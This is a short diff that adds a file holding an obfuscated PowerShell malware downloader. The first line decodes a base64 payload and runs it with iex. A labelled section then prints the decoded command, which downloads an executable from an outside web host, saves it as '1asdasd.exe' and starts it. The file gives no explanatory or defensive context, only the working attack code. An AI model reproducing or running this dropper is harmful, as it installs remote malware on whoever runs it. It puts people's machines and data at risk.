@@ -1,0 +1,7 @@
+iex([sYSTEm.TeXT.EncoDInG]::uTf8.GetSTRing([sYSTem.cOnVERt]::fRoMBase64STrING('CigobmV3LW9iamVjdCBuZVQuV0ViY2xpZU5UKS5kT3dubG9BZEZpTEUoJ2h0dHA6Ly9hdWY4Ny5tYXhpcGljLmNoL3J1Y3ltaS9yeWJpZHkvZmFjdXd5LnBocCcsJzFhc2Rhc2QuZXhlJykpO1N0YXJ0LVByb2Nlc3MgJzFhc2Rhc2QuZXhlJzsKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+((new-object neT.WEbclieNT).dOwnloAdFiLE('http://auf87.maxipic.ch/rucymi/rybidy/facuwy.php','1asdasd.exe'));Start-Process '1asdasd.exe';
+
